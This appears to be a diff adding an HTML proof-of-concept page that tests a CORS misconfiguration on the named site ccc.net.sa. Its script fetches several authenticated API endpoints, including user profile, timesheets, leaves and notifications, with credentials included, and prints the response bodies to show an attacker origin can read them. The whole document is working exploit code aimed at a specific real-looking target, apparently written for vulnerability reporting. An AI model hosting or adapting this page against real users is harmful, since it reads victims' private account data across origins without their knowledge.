@@ -1,0 +1,33 @@
+<!doctype html>
+<html>
+  <head><meta charset="utf-8"><title>CCC CORS PoC</title>
+    <style>body{font-family:monospace;margin:24px}pre{white-space:pre-wrap;word-break:break-all}.ok{color:#070}.bad{color:#b00}</style>
+  </head>
+  <body>
+    <h3>ccc.net.sa — Cross-Origin Read PoC</h3>
+    <p>Attacker origin: <b id="o"></b></p>
+    <p>Fetching the CCC API <b>cross-origin with credentials</b>.
+       A correctly configured server would block these reads.</p>
+    <pre id="out">running...</pre>
+
+    <script>
+      document.getElementById('o').textContent = location.origin;
+      const endpoints = ['/api/health', '/api/auth/me', '/api/users/me', '/api/timesheets', '/api/dashboard', '/api/leaves', '/api/notifications'];
+      const out = document.getElementById('out');
+
+      (async () => {
+        let s = '';
+        for (const p of endpoints) {
+          try {
+            const r = await fetch('https://ccc.net.sa' + p, { credentials: 'include' });
+            const t = await r.text();
+            s += `ALLOWED (no CORS block)  ${p}  -> HTTP ${r.status}\n    body: ${t.slice(0,140)}\n\n`;
+          } catch (e) {
+            s += `BLOCKED BY CORS  ${p}  -> ${e}\n\n`;
+          }
+        }
+        out.textContent = s + "\n=> The attacker origin can read ccc.net.sa API responses.";
+      })();
+    </script>
+  </body>
+</html>
